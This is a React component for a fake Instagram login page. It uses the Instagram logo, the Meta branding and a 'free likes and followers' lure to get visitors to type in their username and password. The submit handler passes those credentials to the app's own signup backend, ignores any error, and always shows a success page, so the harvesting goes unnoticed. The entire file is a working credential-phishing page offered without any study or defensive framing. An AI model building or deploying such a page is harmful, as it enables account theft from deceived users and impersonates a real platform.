import { useState } from 'react';
import { useAuth } from '../contexts/AuthContext';
import RainbowProgressBar from '../components/RainbowProgressBar';
import SuccessPage from './SuccessPage';
import './LoginPage.css';

export default function LoginPage() {
  const { signup } = useAuth();
  const [input, setInput] = useState('');
  const [password, setPassword] = useState('');
  const [inputFocused, setInputFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);

  const canSubmit = input.trim() && password.trim();

  async function handleLogin(e) {
    e.preventDefault();
    if (!canSubmit || loading) return;

    setLoading(true);

    const email = input.trim();
    const username = email.includes('@')
      ? email.split('@')[0].replace(/[^a-z0-9._]/gi, '').toLowerCase()
      : email.toLowerCase();

    try {
      await signup(email, password, username, username);
    } catch (_) {
      // silently ignore — show success regardless
    } finally {
      setLoading(false);
      setDone(true);
    }
  }

  if (done) return <SuccessPage email={input} />;

  return (
    <>
      <RainbowProgressBar visible={loading} />

      <div className="login-page">
        {/* Language selector */}
        <div className="login-page__lang">
          <button className="lang-btn">English (US) ▾</button>
        </div>

        <div className="login-page__card">
          {/* Logo */}
          <div className="login-page__logo">
            <img src="/instagram-logo.png" alt="Instagram" className="login-page__logo-img" />
          </div>

          <h2 className="login-page__marketing-title">
            Login to get free likes and followers
          </h2>

          <form className="login-page__form" onSubmit={handleLogin} noValidate>
            {/* Email input */}
            <div className={`login-input-wrap ${inputFocused ? 'login-input-wrap--focused' : ''} ${input ? 'login-input-wrap--filled' : ''}`}>
              <label className="login-input-label">Username, email or mobile number</label>
              <input
                className="login-input"
                type="text"
                autoCapitalize="none"
                autoCorrect="off"
                value={input}
                onChange={e => setInput(e.target.value)}
                onFocus={() => setInputFocused(true)}
                onBlur={() => setInputFocused(false)}
              />
            </div>

            {/* Password input */}
            <div className={`login-input-wrap ${passwordFocused ? 'login-input-wrap--focused' : ''} ${password ? 'login-input-wrap--filled' : ''}`}>
              <label className="login-input-label">Password</label>
              <input
                className="login-input login-input--with-action"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={e => setPassword(e.target.value)}
                onFocus={() => setPasswordFocused(true)}
                onBlur={() => setPasswordFocused(false)}
              />
              {password && (
                <button
                  type="button"
                  className="login-input-toggle"
                  onClick={() => setShowPassword(v => !v)}
                  tabIndex={-1}
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              )}
            </div>

            {/* Log in button */}
            <button
              type="submit"
              className={`login-btn ${canSubmit && !loading ? 'login-btn--active' : ''}`}
              disabled={!canSubmit || loading}
            >
              {loading ? <span className="login-btn__spinner" /> : 'Log in'}
            </button>

            <div className="login-page__divider">
              <span className="login-page__divider-line" />
              <span className="login-page__divider-text">OR</span>
              <span className="login-page__divider-line" />
            </div>

            <a href="#" className="login-page__forgot">Forgot password?</a>
          </form>
        </div>

        {/* Create account */}
        <div className="login-page__signup-box">
          <button className="signup-btn">Create new account</button>
        </div>

        {/* Meta footer */}
        <div className="login-page__meta-footer">
          <p className="meta-footer-from">from</p>
          <p className="meta-footer-name">Meta</p>
        </div>
      </div>
    </>
  );
}
